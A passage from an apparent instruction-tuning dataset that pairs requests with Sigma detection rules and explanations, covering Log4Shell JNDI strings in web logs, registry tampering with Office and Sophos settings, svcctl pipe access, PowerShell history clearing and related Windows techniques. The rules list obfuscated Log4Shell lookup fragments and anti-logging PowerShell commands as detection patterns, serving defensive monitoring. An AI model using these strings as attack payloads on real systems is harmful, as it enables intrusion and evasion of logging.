'${jndi:nis'\n            - '${jndi:nds'\n            - '${jndi:corba'\n            - '${jndi:iiop'\n            - 'Reference Class Name: foo'\n            - '${${env:BARFOO:-j}'\n            - '${::-l}${::-d}${::-a}${::-p}'\n            - '${base64:JHtqbmRp'\n            - '${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}$'\n            - '${${lower:j}ndi:'\n            - '${${upper:j}ndi:'\n            - '${${::-j}${::-n}${::-d}${::-i}:'\n    selection4:\n        cs-referer|contains:\n            - '${jndi:ldap:/'\n            - '${jndi:rmi:/'\n            - '${jndi:ldaps:/'\n            - '${jndi:dns:/'\n            - '/$%7bjndi:'\n            - '%24%7bjndi:'\n            - '$%7Bjndi:'\n            - '%2524%257Bjndi'\n            - '%2F%252524%25257Bjndi%3A'\n            - '${jndi:${lower:'\n            - '${::-j}${'\n            - '${jndi:nis'\n            - '${jndi:nds'\n            - '${jndi:corba'\n            - '${jndi:iiop'\n            - 'Reference Class Name: foo'\n            - '${${env:BARFOO:-j}'\n            - '${::-l}${::-d}${::-a}${::-p}'\n            - '${base64:JHtqbmRp'\n            - '${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}$'\n            - '${${lower:j}ndi:'\n            - '${${upper:j}ndi:'\n            - '${${::-j}${::-n}${::-d}${::-i}:'\n    condition: 1 of selection*\nfalsepositives:\n    - Vulnerability scanning\nlevel: high\n",
      "question": "exploitation attempt against log4j RCE vulnerability reported as CVE-2021-44228 in different header fields found in web server logs (Log4Shell)",
      "answer": "In order to detect exploitation attempts against the log4j RCE vulnerability reported as CVE-2021-44228 in different header fields found in web server logs (Log4Shell), you should monitor web server log entries for specific patterns that indicate an attack attempt. Focus should be on the 'User-Agent', 'URI Query', and 'Referer' header fields of web traffic. These fields are commonly abused by attackers to deliver malicious payloads exploiting the Log4Shell vulnerability. \n\nLook out for the presence of certain key patterns within these fields, which include variations of the JNDI lookup strings such as '${jndi:ldap:/', '${jndi:rmi:/', and others that involve encoded versions of these strings or manipulations aimed at evading simple detection mechanisms (e.g., '${base64:JHtqbmRp', '${${env:BARFOO:-j}', and '${${lower:j}ndi:'). Also, signs of obfuscation like strings containing encoded '${jndi:' and other crafted entries indicating attempts to leverage the Log4Shell vulnerability should be carefully examined.\n\nIt's important to adjust monitoring tools to detect these specific patterns in the 'User-Agent', 'URI Query', and 'Referer' fields to promptly identify and respond to potential exploitation attempts. However, be mindful of possible false positives, such as those that might arise from vulnerability scanning activities, and adjust the detection mechanisms accordingly. The level of threat associated with these detection patterns is considered high, underscoring the necessity of implementing these measures to secure web servers against this critical vulnerability."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Use of hostname to get information.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to use hostname to get information, you should: Monitor the creation of processes on Windows systems, focusing on identifying the initiation of any process whose image name ends with '\\HOSTNAME.EXE'. This tracking is pivotal as it could indicate attempts to gather information by exploiting the system's hostname properties or related functionalities. False positives might occur and are currently unknown, suggesting the need for cautious interpretation of detection alerts. This activity is noted with a low level of severity, indicating that while it may not immediately signify a high-threat action, it is still worth surveillance for comprehensive security monitoring.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\HOSTNAME.EXE'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\HOSTNAME.EXE'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: low\n",
      "question": "Use of hostname to get information",
      "answer": "In order to use hostname to get information, you should: Monitor the creation of processes on Windows systems, focusing on identifying the initiation of any process whose image name ends with '\\HOSTNAME.EXE'. This tracking is pivotal as it could indicate attempts to gather information by exploiting the system's hostname properties or related functionalities. False positives might occur and are currently unknown, suggesting the need for cautious interpretation of detection alerts. This activity is noted with a low level of severity, indicating that while it may not immediately signify a high-threat action, it is still worth surveillance for comprehensive security monitoring."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting changes to the registry keys related to \"Trusted Location\" of Microsoft Office. Attackers might add additional trusted locations to avoid macro security restrictions..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect changes to the registry keys related to \"Trusted Location\" of Microsoft Office, where attackers might add additional trusted locations to avoid macro security restrictions, you should: Focus on monitoring Windows registry activities, specifically looking for events where registry keys under the \"Security\\Trusted Locations\\Location\" path are modified. These modifications are identified by the EventType \"Setvalue\", which indicates a value within a registry key has been changed. Pay particular attention to registry keys that end with '\\Path', as these are directly related to the locations that Microsoft Office considers trusted. It's crucial to note that legitimate office installations or setups may also modify these keys, adding trusted locations and potentially triggering a detection. Therefore, these changes are categorized with a medium level of concern due to possible false positives during such installations or configurations. Continuously monitoring these registry changes can help in identifying unauthorized attempts to bypass macro security restrictions by tampering with trusted locations.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: Setvalue\n        TargetObject|contains: 'Security\\Trusted Locations\\Location'\n        TargetObject|endswith: '\\Path'\n    condition: selection\nfalsepositives:\n    - During office installations or setup, trusted locations are added, which will trigger this rule.\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: Setvalue\n        TargetObject|contains: 'Security\\Trusted Locations\\Location'\n        TargetObject|endswith: '\\Path'\n    condition: selection\nfalsepositives:\n    - During office installations or setup, trusted locations are added, which will trigger this rule.\nlevel: medium\n",
      "question": "changes to the registry keys related to \"Trusted Location\" of Microsoft Office. Attackers might add additional trusted locations to avoid macro security restrictions.",
      "answer": "In order to detect changes to the registry keys related to \"Trusted Location\" of Microsoft Office, where attackers might add additional trusted locations to avoid macro security restrictions, you should: Focus on monitoring Windows registry activities, specifically looking for events where registry keys under the \"Security\\Trusted Locations\\Location\" path are modified. These modifications are identified by the EventType \"Setvalue\", which indicates a value within a registry key has been changed. Pay particular attention to registry keys that end with '\\Path', as these are directly related to the locations that Microsoft Office considers trusted. It's crucial to note that legitimate office installations or setups may also modify these keys, adding trusted locations and potentially triggering a detection. Therefore, these changes are categorized with a medium level of concern due to possible false positives during such installations or configurations. Continuously monitoring these registry changes can help in identifying unauthorized attempts to bypass macro security restrictions by tampering with trusted locations."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting modification of autostart extensibility point (ASEP) in registry..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect modification of autostart extensibility point (ASEP) in registry, you should focus on monitoring registry set activities within the Windows environment, specifically targeting the Internet Explorer settings stored in the Windows registry. Monitoring should flag events where the \"SetValue\" action is performed on registry keys related to Internet Explorer, including both the standard and Wow6432Node paths.\n\nSpecial attention should be paid to modifications aimed at Internet Explorer's toolbar settings, extensions, and explorer bars, as these areas are common targets for attackers seeking to maintain persistence or execute malicious code upon system startup. To accurately detect potential threats, filters should be applied to exclude known benign alterations, like those stemming from legitimate software installations or configurations performed by an administrator. These exclusions involve ignoring certain detailed registry paths that signify legitimate extensions or toolbar settings.\n\nFor effective detection, the analysis should capture specific fields such as the SecurityID, ObjectName, OldValueType, and NewValueType, providing context to the registry modification event.\n\nHowever, it's important to handle alerts with caution, acknowledging that false positives can occur. These can result from legitimate software installations that necessitate changes to autostart configurations or from administrative actions taken for genuine reasons. The level of threat associated with detected alterations is considered medium, underscoring the potential for misuse but also recognizing that not all modifications are indicative of malicious intent.\n\nBy closely observing these specific registry interactions and employing a discerning filtering process, one can robustly detect unauthorized modifications that compromise the autostart extensibility points (ASEP) in the system, thereby protecting against attacks that seek to leverage Internet Explorer as a vector for persistent access or malicious execution.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    ie:\n        EventType: SetValue\n        TargetObject|contains:\n            - '\\Software\\Wow6432Node\\Microsoft\\Internet Explorer'\n            - '\\Software\\Microsoft\\Internet Explorer'\n    ie_details:\n        TargetObject|contains:\n            - '\\Toolbar'\n            - '\\Extensions'\n            - '\\Explorer Bars'\n    filter_empty:\n        Details: '(Empty)'\n    filter_extensions:\n        TargetObject|contains:\n            - '\\Extensions\\{2670000A-7350-4f3c-8081-5663EE0C6C49}'\n            - '\\Extensions\\{31D09BA0-12F5-4CCE-BE8A-2923E76605DA}'\n            - '\\Extensions\\{789FE86F-6FC4-46A1-9849-EDE0DB0C95CA}'\n            - '\\Extensions\\{A95fe080-8f5d-11d2-a20b-00aa003c157a}'\n    filter_toolbar:\n        TargetObject|endswith:\n            - '\\Toolbar\\ShellBrowser\\ITBar7Layout'\n            - '\\Toolbar\\ShowDiscussionButton'\n            - '\\Toolbar\\Locked'\n    condition: ie and ie_details and not 1 of filter_*\nfields:\n    - SecurityID\n    - ObjectName\n    - OldValueType\n    - NewValueType\nfalsepositives:\n    - Legitimate software automatically (mostly, during installation) sets up autorun keys for legitimate reason\n    - Legitimate administrator sets up autorun keys for legitimate reason\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    ie:\n        EventType: SetValue\n        TargetObject|contains:\n            - '\\Software\\Wow6432Node\\Microsoft\\Internet Explorer'\n            - '\\Software\\Microsoft\\Internet Explorer'\n    ie_details:\n        TargetObject|contains:\n            - '\\Toolbar'\n            - '\\Extensions'\n            - '\\Explorer Bars'\n    filter_empty:\n        Details: '(Empty)'\n    filter_extensions:\n        TargetObject|contains:\n            - '\\Extensions\\{2670000A-7350-4f3c-8081-5663EE0C6C49}'\n            - '\\Extensions\\{31D09BA0-12F5-4CCE-BE8A-2923E76605DA}'\n            - '\\Extensions\\{789FE86F-6FC4-46A1-9849-EDE0DB0C95CA}'\n            - '\\Extensions\\{A95fe080-8f5d-11d2-a20b-00aa003c157a}'\n    filter_toolbar:\n        TargetObject|endswith:\n            - '\\Toolbar\\ShellBrowser\\ITBar7Layout'\n            - '\\Toolbar\\ShowDiscussionButton'\n            - '\\Toolbar\\Locked'\n    condition: ie and ie_details and not 1 of filter_*\nfields:\n    - SecurityID\n    - ObjectName\n    - OldValueType\n    - NewValueType\nfalsepositives:\n    - Legitimate software automatically (mostly, during installation) sets up autorun keys for legitimate reason\n    - Legitimate administrator sets up autorun keys for legitimate reason\nlevel: medium\n",
      "question": "modification of autostart extensibility point (ASEP) in registry.",
      "answer": "In order to detect modification of autostart extensibility point (ASEP) in registry, you should focus on monitoring registry set activities within the Windows environment, specifically targeting the Internet Explorer settings stored in the Windows registry. Monitoring should flag events where the \"SetValue\" action is performed on registry keys related to Internet Explorer, including both the standard and Wow6432Node paths.\n\nSpecial attention should be paid to modifications aimed at Internet Explorer's toolbar settings, extensions, and explorer bars, as these areas are common targets for attackers seeking to maintain persistence or execute malicious code upon system startup. To accurately detect potential threats, filters should be applied to exclude known benign alterations, like those stemming from legitimate software installations or configurations performed by an administrator. These exclusions involve ignoring certain detailed registry paths that signify legitimate extensions or toolbar settings.\n\nFor effective detection, the analysis should capture specific fields such as the SecurityID, ObjectName, OldValueType, and NewValueType, providing context to the registry modification event.\n\nHowever, it's important to handle alerts with caution, acknowledging that false positives can occur. These can result from legitimate software installations that necessitate changes to autostart configurations or from administrative actions taken for genuine reasons. The level of threat associated with detected alterations is considered medium, underscoring the potential for misuse but also recognizing that not all modifications are indicative of malicious intent.\n\nBy closely observing these specific registry interactions and employing a discerning filtering process, one can robustly detect unauthorized modifications that compromise the autostart extensibility points (ASEP) in the system, thereby protecting against attacks that seek to leverage Internet Explorer as a vector for persistent access or malicious execution."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting remote service activity via remote access to the svcctl named pipe.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect remote service activity via remote access to the svcctl named pipe, you should monitor the Windows security logs for specific events that indicate such activity. Specifically, look for events with an ID of 5145, which indicate an attempt to access a file share. The focus should be on access attempts to the special IPC$ share, which is a hidden share used for inter-process communication. The named pipe in question is 'svcctl', which is commonly interacted with when attempting to manage services remotely.\n\nYou should also look for actions that involve 'WriteData' accesses, as this signals an attempt to write data to the named pipe, potentially indicating that an attacker is attempting to execute commands or manipulate services on the target machine remotely. This monitoring approach is critical for enhancing detection capabilities against adversaries trying to exploit remote service functionalities for malicious purposes.\n\nThe detection strategy is associated with tactics and techniques that include Execution, Persistence, Privilege Escalation, and Lateral Movement, notably when attackers are attempting to leverage remote services to execute commands, maintain their foothold, escalate their privileges, or move laterally across the network. Given the nature of these activities, there might be unknown scenarios that could trigger false positives; however, detecting such actions is vital for identifying and mitigating potential security threats related to unauthorized remote service manipulation.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\n    definition: 'The advanced audit policy setting \"Object Access > Audit Detailed File Share\" must be configured for Success/Failure'\ndetection:\n    selection:\n        EventID: 5145\n        ShareName: '\\\\\\\\\\*\\\\IPC$' # looking for the string \\\\*\\IPC$\n        RelativeTargetName: svcctl\n        Accesses|contains: 'WriteData'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\n    definition: 'The advanced audit policy setting \"Object Access > Audit Detailed File Share\" must be configured for Success/Failure'\ndetection:\n    selection:\n        EventID: 5145\n        ShareName: '\\\\\\\\\\*\\\\IPC$' # looking for the string \\\\*\\IPC$\n        RelativeTargetName: svcctl\n        Accesses|contains: 'WriteData'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "remote service activity via remote access to the svcctl named pipe",
      "answer": "In order to detect remote service activity via remote access to the svcctl named pipe, you should monitor the Windows security logs for specific events that indicate such activity. Specifically, look for events with an ID of 5145, which indicate an attempt to access a file share. The focus should be on access attempts to the special IPC$ share, which is a hidden share used for inter-process communication. The named pipe in question is 'svcctl', which is commonly interacted with when attempting to manage services remotely.\n\nYou should also look for actions that involve 'WriteData' accesses, as this signals an attempt to write data to the named pipe, potentially indicating that an attacker is attempting to execute commands or manipulate services on the target machine remotely. This monitoring approach is critical for enhancing detection capabilities against adversaries trying to exploit remote service functionalities for malicious purposes.\n\nThe detection strategy is associated with tactics and techniques that include Execution, Persistence, Privilege Escalation, and Lateral Movement, notably when attackers are attempting to leverage remote services to execute commands, maintain their foothold, escalate their privileges, or move laterally across the network. Given the nature of these activities, there might be unknown scenarios that could trigger false positives; however, detecting such actions is vital for identifying and mitigating potential security threats related to unauthorized remote service manipulation."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting usage of the \"Write-EventLog\" cmdlet with 'RawData' flag. The cmdlet can be levreage to write malicious payloads to the EventLog and then retrieve them later for later use.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the usage of the \"Write-EventLog\" cmdlet with 'RawData' flag, which can be leveraged to write malicious payloads to the EventLog and then retrieve them later for use, you should: focus on monitoring Windows PowerShell script activities. This specifically entails ensuring that Script Block Logging is enabled, which is crucial for logging detailed execution information about PowerShell scripts, including the content of the scripts themselves. The detection strategy hinges on identifying the use of the \"Write-EventLog\" cmdlet in conjunction with the '-RawData' parameter within PowerShell scripts. These parameters together are indicative of an attempt to log data potentially for malicious purposes. It's essential to be aware of false positives, as legitimate applications may utilize this cmdlet for non-malicious purposes. Therefore, each alert generated under these criteria should be thoroughly investigated to ascertain whether the activity is benign or malevolent. The security severity associated with this kind of activity is considered medium, reflecting the need for prompt but measured response actions.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains|all:\n            - 'Write-EventLog'\n            - '-RawData '\n    condition: selection\nfalsepositives:\n    - Legitimate applications writing events via this cmdlet. Investigate alerts to determine if the action is benign\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains|all:\n            - 'Write-EventLog'\n            - '-RawData '\n    condition: selection\nfalsepositives:\n    - Legitimate applications writing events via this cmdlet. Investigate alerts to determine if the action is benign\nlevel: medium\n",
      "question": "usage of the \"Write-EventLog\" cmdlet with 'RawData' flag. The cmdlet can be levreage to write malicious payloads to the EventLog and then retrieve them later for later use",
      "answer": "In order to detect the usage of the \"Write-EventLog\" cmdlet with 'RawData' flag, which can be leveraged to write malicious payloads to the EventLog and then retrieve them later for use, you should: focus on monitoring Windows PowerShell script activities. This specifically entails ensuring that Script Block Logging is enabled, which is crucial for logging detailed execution information about PowerShell scripts, including the content of the scripts themselves. The detection strategy hinges on identifying the use of the \"Write-EventLog\" cmdlet in conjunction with the '-RawData' parameter within PowerShell scripts. These parameters together are indicative of an attempt to log data potentially for malicious purposes. It's essential to be aware of false positives, as legitimate applications may utilize this cmdlet for non-malicious purposes. Therefore, each alert generated under these criteria should be thoroughly investigated to ascertain whether the activity is benign or malevolent. The security severity associated with this kind of activity is considered medium, reflecting the need for prompt but measured response actions."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting when verclsid.exe is used to run COM object via GUID.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when verclsid.exe is used to run COM object via GUID, you should: note that this detection focuses on Windows process creation events. Specifically, it looks for instances where the process 'verclsid.exe' is executed, which can be identified either by the image name ending with '\\verclsid.exe' or the original file name being 'verclsid.exe'. Additionally, the command line arguments are scrutinized for the presence of both '/S' and '/C', indicating a specific mode of operation often associated with this type of attack. The relevant data fields to observe include the command line arguments used during the process execution. It\u2019s important to be aware that there may be legitimate uses of this process, although they are currently unkown, and thus, potential false positives should be considered with a medium level of caution. The primary goal is to identify suspicious activities related to the execution of COM objects, which could indicate an attack based on the provided MITRE ATT&CK tactics and techniques.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\verclsid.exe'\n        - OriginalFileName: 'verclsid.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - '/S'\n            - '/C'\n    condition: all of selection_*\nfields:\n    - CommandLine\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\verclsid.exe'\n        - OriginalFileName: 'verclsid.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - '/S'\n            - '/C'\n    condition: all of selection_*\nfields:\n    - CommandLine\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "when verclsid.exe is used to run COM object via GUID",
      "answer": "In order to detect when verclsid.exe is used to run COM object via GUID, you should: note that this detection focuses on Windows process creation events. Specifically, it looks for instances where the process 'verclsid.exe' is executed, which can be identified either by the image name ending with '\\verclsid.exe' or the original file name being 'verclsid.exe'. Additionally, the command line arguments are scrutinized for the presence of both '/S' and '/C', indicating a specific mode of operation often associated with this type of attack. The relevant data fields to observe include the command line arguments used during the process execution. It\u2019s important to be aware that there may be legitimate uses of this process, although they are currently unkown, and thus, potential false positives should be considered with a medium level of caution. The primary goal is to identify suspicious activities related to the execution of COM objects, which could indicate an attack based on the provided MITRE ATT&CK tactics and techniques."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting default filename used in PoC code against print spooler vulnerability CVE-2021-1675.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the default filename used in PoC code against print spooler vulnerability CVE-2021-1675, you should: Monitor file events on Windows systems, specifically focusing on the creation or modification of files within the directory `C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\1\\`. The critical file to watch for includes the filename `123` within this specific path. This activity is indicative of attempts to exploit the known CVE-2021-1675 vulnerability targeting the Windows Print Spooler service. It's important to log and analyze the `ComputerName` and `TargetFilename` for any occurrences. Be aware that there might be no known false positive cases, underlining the critical nature of this detection effort.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: file_event\n    product: windows\ndetection:\n    selection:\n        TargetFilename|contains: 'C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\1\\123'\n    condition: selection\nfalsepositives:\n    - Unknown\nfields:\n    - ComputerName\n    - TargetFilename\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: file_event\n    product: windows\ndetection:\n    selection:\n        TargetFilename|contains: 'C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\1\\123'\n    condition: selection\nfalsepositives:\n    - Unknown\nfields:\n    - ComputerName\n    - TargetFilename\nlevel: critical\n",
      "question": "default filename used in PoC code against print spooler vulnerability CVE-2021-1675",
      "answer": "In order to detect the default filename used in PoC code against print spooler vulnerability CVE-2021-1675, you should: Monitor file events on Windows systems, specifically focusing on the creation or modification of files within the directory `C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\1\\`. The critical file to watch for includes the filename `123` within this specific path. This activity is indicative of attempts to exploit the known CVE-2021-1675 vulnerability targeting the Windows Print Spooler service. It's important to log and analyze the `ComputerName` and `TargetFilename` for any occurrences. Be aware that there might be no known false positive cases, underlining the critical nature of this detection effort."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting keywords that could indicate clearing PowerShell history.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect keywords that could indicate clearing PowerShell history, you should monitor Windows PowerShell modules for specific command patterns that suggest attempts to delete or otherwise manipulate PowerShell command history. This detection focuses on various payloads that attackers might use to cover their tracks or prevent their PowerShell commands from being logged or recovered later.\n\nFirstly, look for commands that directly attempt to delete items or clear history, such as 'del', 'Remove-Item', or 'rm'. These commands can be indicative of an attempt to remove specific files or logs, including potentially the PowerShell history itself.\n\nAdditionally, pay attention to commands involving '(Get-PSReadlineOption).HistorySavePath'. This could suggest an attacker is attempting to identify the path where PowerShell history is saved, likely as a precursor to altering or deleting these history files.\n\nFurther, be on the lookout for sequences of commands designed to change the PowerShell history saving behavior. Specifically, sequences that contain 'Set-PSReadlineOption' in conjunction with either '\u2013HistorySaveStyle' or '-HistorySaveStyle' followed by 'SaveNothing'. These commands instruct PowerShell not to save any history, effectively preventing any future audit or review of executed commands.\n\nIt's important to note that while these patterns are strongly indicative of suspicious activity aimed at obscuring an attacker\u2019s actions, there can be legitimate use cases for such scripts. For example, system administrators might use similar commands during routine maintenance or script deployments. Therefore, detected instances should be investigated to differentiate between malicious activities and legitimate administrative tasks.\n\nThis detection is aligned with MITRE ATT&CK tactics and techniques that include Defense Evasion through Indicator Removal on Host, specifically the technique related to clearing command history. Recognizing attempts to manipulate PowerShell history is essential for maintaining visibility into the actions performed on Windows systems and thwarting attempts by attackers to hide their tracks.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_module\n    definition: 0ad03ef1-f21b-4a79-8ce8-e6900c54b65b\ndetection:\n    selection_1a_payload:\n        Payload|contains:\n            - 'del'\n            - 'Remove-Item'\n            - 'rm'\n    selection_1b_payload:\n        Payload|contains: '(Get-PSReadlineOption).HistorySavePath'\n    selection_payload_2:\n        Payload|contains|all:\n            - 'Set-PSReadlineOption'\n            - '\u2013HistorySaveStyle'  # not sure if the homoglyph \u2013/- is intended, just checking for both\n            - 'SaveNothing'\n    selection_payload_3:\n        Payload|contains|all:\n            - 'Set-PSReadlineOption'\n            - '-HistorySaveStyle'\n            - 'SaveNothing'\n    condition: 1 of selection_payload_* or all of selection_1*\nfalsepositives:\n    - Legitimate PowerShell scripts\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_module\n    definition: 0ad03ef1-f21b-4a79-8ce8-e6900c54b65b\ndetection:\n    selection_1a_payload:\n        Payload|contains:\n            - 'del'\n            - 'Remove-Item'\n            - 'rm'\n    selection_1b_payload:\n        Payload|contains: '(Get-PSReadlineOption).HistorySavePath'\n    selection_payload_2:\n        Payload|contains|all:\n            - 'Set-PSReadlineOption'\n            - '\u2013HistorySaveStyle'  # not sure if the homoglyph \u2013/- is intended, just checking for both\n            - 'SaveNothing'\n    selection_payload_3:\n        Payload|contains|all:\n            - 'Set-PSReadlineOption'\n            - '-HistorySaveStyle'\n            - 'SaveNothing'\n    condition: 1 of selection_payload_* or all of selection_1*\nfalsepositives:\n    - Legitimate PowerShell scripts\nlevel: medium\n",
      "question": "keywords that could indicate clearing PowerShell history",
      "answer": "In order to detect keywords that could indicate clearing PowerShell history, you should monitor Windows PowerShell modules for specific command patterns that suggest attempts to delete or otherwise manipulate PowerShell command history. This detection focuses on various payloads that attackers might use to cover their tracks or prevent their PowerShell commands from being logged or recovered later.\n\nFirstly, look for commands that directly attempt to delete items or clear history, such as 'del', 'Remove-Item', or 'rm'. These commands can be indicative of an attempt to remove specific files or logs, including potentially the PowerShell history itself.\n\nAdditionally, pay attention to commands involving '(Get-PSReadlineOption).HistorySavePath'. This could suggest an attacker is attempting to identify the path where PowerShell history is saved, likely as a precursor to altering or deleting these history files.\n\nFurther, be on the lookout for sequences of commands designed to change the PowerShell history saving behavior. Specifically, sequences that contain 'Set-PSReadlineOption' in conjunction with either '\u2013HistorySaveStyle' or '-HistorySaveStyle' followed by 'SaveNothing'. These commands instruct PowerShell not to save any history, effectively preventing any future audit or review of executed commands.\n\nIt's important to note that while these patterns are strongly indicative of suspicious activity aimed at obscuring an attacker\u2019s actions, there can be legitimate use cases for such scripts. For example, system administrators might use similar commands during routine maintenance or script deployments. Therefore, detected instances should be investigated to differentiate between malicious activities and legitimate administrative tasks.\n\nThis detection is aligned with MITRE ATT&CK tactics and techniques that include Defense Evasion through Indicator Removal on Host, specifically the technique related to clearing command history. Recognizing attempts to manipulate PowerShell history is essential for maintaining visibility into the actions performed on Windows systems and thwarting attempts by attackers to hide their tracks."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting tamper attempts to sophos av functionality via registry key modification.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect tamper attempts to Sophos AV functionality via registry key modification, you should: Focus on monitoring registry set actions within Windows environments. Specifically, look out for the event type `SetValue`, indicating a modification attempt on registry keys. Key targets for this detection are registry paths related to Sophos Endpoint Defense and SAVService tamper protection configurations, which include:\n\n- `\\Sophos Endpoint Defense\\TamperProtection\\Config\\SAVEnabled`\n- `\\Sophos Endpoint Defense\\TamperProtection\\Config\\SEDEnabled`\n- `\\Sophos\\SAVService\\TamperProtection\\Enabled`\n\nA critical signal of a tampering attempt is the modification of these registry keys' values to `DWORD (0x00000000)`, effectively disabling the Sophos Endpoint Defense tamper protection features. \n\nKeep in mind that there might be false positives, such as when the antivirus itself legitimately disables this feature. Thus, any modifications to these registry keys should be investigated to confirm whether they are legitimate changes or potential security threats. The severity level of this detection is high, underscoring the importance of such monitoring in maintaining the integrity of Sophos antivirus functionalities against tampering efforts.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|contains:\n            - '\\Sophos Endpoint Defense\\TamperProtection\\Config\\SAVEnabled'\n            - '\\Sophos Endpoint Defense\\TamperProtection\\Config\\SEDEnabled'\n            - '\\Sophos\\SAVService\\TamperProtection\\Enabled'\n        Details: DWORD (0x00000000)\n    condition: selection\nfalsepositives:\n    - Some FP may occur when the feature is disabled by the AV itself, you should always investigate if the action was legitimate\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|contains:\n            - '\\Sophos Endpoint Defense\\TamperProtection\\Config\\SAVEnabled'\n            - '\\Sophos Endpoint Defense\\TamperProtection\\Config\\SEDEnabled'\n            - '\\Sophos\\SAVService\\TamperProtection\\Enabled'\n        Details: DWORD (0x00000000)\n    condition: selection\nfalsepositives:\n    - Some FP may occur when the feature is disabled by the AV itself, you should always investigate if the action was legitimate\nlevel: high\n",
      "question": "tamper attempts to sophos av functionality via registry key modification",
      "answer": "In order to detect tamper attempts to Sophos AV functionality via registry key modification, you should: Focus on monitoring registry set actions within Windows environments. Specifically, look out for the event type `SetValue`, indicating a modification attempt on registry keys. Key targets for this detection are registry paths related to Sophos Endpoint Defense and SAVService tamper protection configurations, which include:\n\n- `\\Sophos Endpoint Defense\\TamperProtection\\Config\\SAVEnabled`\n- `\\Sophos Endpoint Defense\\TamperProtection\\Config\\SEDEnabled`\n- `\\Sophos\\SAVService\\TamperProtection\\Enabled`\n\nA critical signal of a tampering attempt is the modification of these registry keys' values to `DWORD (0x00000000)`, effectively disabling the Sophos Endpoint Defense tamper protection features. \n\nKeep in mind that there might be false positives, such as when the antivirus itself legitimately disables this feature. Thus, any modifications to these registry keys should be investigated to confirm whether they are legitimate changes or potential security threats. The severity level of this detection is high, underscoring the importance of such monitoring in maintaining the integrity of Sophos antivirus functionalities against tampering efforts."
    }
  },
  {
